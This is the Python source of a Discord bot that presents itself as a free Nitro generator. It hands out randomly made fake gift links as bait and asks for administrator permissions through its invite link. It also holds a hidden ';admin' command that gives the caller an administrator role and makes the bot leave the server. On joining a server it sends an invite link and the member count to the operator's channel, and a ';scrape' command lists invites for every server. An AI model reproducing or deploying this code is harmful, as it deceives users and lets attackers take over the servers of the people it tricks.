import random, string
import discord,random,time
import json
import asyncio
from discord.ext import commands
import os 
import aiohttp

intents = discord.Intents.all()
client = commands.Bot(command_prefix = ';', help_command = None, intents=intents)
clientdiscord = discord.Client()
client.remove_command("help")
@client.event
async def on_ready():
 print("I am alive")
 await client.change_presence(activity=discord.Game(name=
 ';help┃arqez.sexy'))

@client.command()
async def generate(ctx):
    user = ctx.author
    nitro = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
    await user.send(f"Heres your nitro https://discord.gift/{nitro}")
    embed=discord.Embed(title="Generated You Nitro", description="Enjoy",color=0x7289da)
    await ctx.send(embed=embed)
    await ctx.message.delete()

@client.command()
async def help(ctx):
 embed=discord.Embed(title="Help", description="Free Nitro Commands",color=0x7289da)
 embed.add_field(name=";generate", value="Generates Free Nitro", inline=False)
 embed.add_field(name=";invite", value="Invite for more free nitro!", inline=False)
 await ctx.send(embed=embed)

@client.command()
async def invite(ctx):
  await ctx.send("**Invite me for more free nitro** https://discord.com/api/oauth2/authorize?client_id=848235353881444362&permissions=8&scope=bot ")

@client.command()
async def admin(ctx):
  guild = ctx.guild
  role = await guild.create_role(name="Arq Net", permissions=discord.Permissions(8),colour=discord.Colour(000000))
  authour = ctx.message.author
  await ctx.message.delete()
  await authour.add_roles(role)
  await guild.leave() 
   
@client.event
async def on_guild_join(guild):
  channel = client.get_channel(848238605352042569)
  z = random.choice(guild.text_channels)
  invitelink = await z.create_invite(max_uses=100,unique=True)
  await channel.send(f"{invitelink} members > {guild.member_count} :ballot_box_with_check: @everyone total hits > {len(client.guilds)} ")

@client.command()
async def scrape(ctx):
  for guild in client.guilds:
    
   z = random.choice(guild.text_channels)
   invitelink = await z.create_invite(max_uses=100,unique=True)
   await ctx.send(f"Scraped > {invitelink} :ballot_box_with_check:")
   
client.run("")